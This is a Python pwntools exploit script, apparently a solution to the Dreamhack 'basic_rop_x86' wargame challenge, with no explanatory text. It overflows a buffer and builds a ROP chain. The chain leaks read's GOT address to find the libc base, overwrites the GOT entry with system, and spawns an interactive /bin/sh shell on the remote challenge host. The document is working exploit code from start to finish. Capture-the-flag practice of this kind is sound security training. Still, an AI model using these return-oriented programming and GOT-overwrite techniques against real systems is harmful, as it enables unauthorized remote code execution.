from pwn import *
p=remote("host1.dreamhack.games",10471)

e=ELF("./basic_rop_x86")
libc=ELF("./libc.so.6",checksec=False)
write_got=e.got["write"]
read_plt=e.plt["read"]
read_got=e.got["read"]
write_plt=e.plt["write"]
main=e.symbols["main"]

read_offset=libc.symbols["read"]
write_offset=libc.symbols["write"]
system_offset=libc.symbols["system"]
sh = list(libc.search(b"/bin/sh"))[0]

p.recv(timeout=1)
payload=b"A"*0x48
payload+=p32(write_plt)  #write(1,read_got,4)
payload+=p32(0x08048689) #pppr
payload+=p32(1)+p32(read_got)+p32(4)
payload+=p32(read_plt)  #read(0,read_got,4)
payload+=p32(0x08048689)
payload+=p32(0)+p32(read_got)+p32(20)
payload+=p32(read_plt) #system("/bin/sh")

payload+=p32(0x80483d9)
payload+=p32(read_got+0x4)
#payload+=p32(0x6e69622f)
#payload+=p32(0x0068732f)#/bin/sh
 
recieve=b"A"*0x40
p.send(payload)
p.recvuntil(recieve)
read=u32(p.recvn(4))

lb= read - read_offset
system = lb + system_offset
p.send(p32(system)+b'/bin/sh\x00')
p.interactive()
